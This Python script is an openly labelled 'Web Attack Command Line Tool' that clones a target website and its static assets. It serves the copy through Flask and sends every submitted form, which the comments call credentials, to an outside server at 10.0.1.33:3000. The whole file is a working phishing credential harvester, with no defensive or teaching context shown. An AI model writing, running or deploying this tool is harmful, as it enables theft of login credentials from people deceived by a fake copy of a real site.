import os
import requests
from flask import Flask, render_template_string, request, redirect
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urljoin

# Initialize Flask app
app = Flask(__name__)

# Global variable to store cloned website HTML and directory for static files
cloned_html = ""
static_dir = "cloned_website_static"

# Function to fetch and clone the target website
def clone_website(target_url):
    try:
        print(f"[INFO] Fetching the target website: {target_url}")
        response = requests.get(target_url)
        if response.status_code == 200:
            print("[INFO] Website cloned successfully!")
            return response.text
        else:
            print(f"[ERROR] Failed to fetch the website. Status code: {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[ERROR] Error fetching website: {e}")
        return None

# Function to forward form data (credentials) to another server (http://10.0.1.33:3000)
def forward_data(form_data, target_url="http://10.0.1.33:3000"):
    try:
        print(f"[INFO] Forwarding data to {target_url}")
        response = requests.post(target_url, data=form_data)
        if response.status_code == 200:
            print(f"[INFO] Data forwarded successfully to {target_url}")
        else:
            print(f"[ERROR] Failed to forward data. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Error forwarding data: {e}")

# Flask route to serve the cloned website
@app.route("/", methods=["GET", "POST"])
def handle_form():
    if request.method == "POST":
        form_data = request.form
        # Forward the form data (credentials) to http://10.0.1.33:3000
        forward_data(form_data)  # Forward form data to the target server
        return redirect("/")  # Redirect to the homepage after submission
    return render_template_string(cloned_html)

# Command-line interface for the tool
def start_cli():
    parser = argparse.ArgumentParser(description="Web Attack Command Line Tool")
    parser.add_argument("command", help="The command to execute (e.g., 'clone')")
    parser.add_argument("target", help="The target URL to clone", nargs="?")
    args = parser.parse_args()

    if args.command == "clone" and args.target:
        print(f"[INFO] Cloning target website: {args.target}")
        cloned_website = clone_website(args.target)
        if cloned_website:
            global cloned_html
            cloned_html = cloned_website
            # Create a directory to store static files
            if not os.path.exists(static_dir):
                os.makedirs(static_dir)
            # Download static assets (e.g., CSS, JS) and save them
            download_static_assets(args.target)
            # Start Flask server to host the cloned website
            print("[INFO] Starting Flask server to host the cloned website...")
            app.run(host="0.0.0.0", port=5000)
    else:
        print("[ERROR] Invalid command or missing target URL")

# Function to download static assets (CSS, JS, images)
def download_static_assets(base_url):
    try:
        print(f"[INFO] Downloading static assets for {base_url}")
        response = requests.get(base_url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")

            # Find all links to CSS files
            for link in soup.find_all("link", {"rel": "stylesheet"}):
                href = link.get("href")
                if href:
                    download_asset(urljoin(base_url, href))

            # Find all links to JavaScript files
            for script in soup.find_all("script", {"src": True}):
                src = script.get("src")
                if src:
                    download_asset(urljoin(base_url, src))

            # Find all images
            for img in soup.find_all("img", {"src": True}):
                src = img.get("src")
                if src:
                    download_asset(urljoin(base_url, src))

        else:
            print(f"[ERROR] Failed to download assets. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Error downloading assets: {e}")

# Function to download a single asset
def download_asset(url):
    try:
        print(f"[INFO] Downloading asset: {url}")
        asset_response = requests.get(url)
        if asset_response.status_code == 200:
            asset_name = os.path.join(static_dir, os.path.basename(url))
            with open(asset_name, "wb") as f:
                f.write(asset_response.content)
            print(f"[INFO] Asset saved to {asset_name}")
        else:
            print(f"[ERROR] Failed to download asset: {url}")
    except requests.RequestException as e:
        print(f"[ERROR] Error downloading asset: {e}")

# Main entry point
if __name__ == "__main__":
    start_cli()
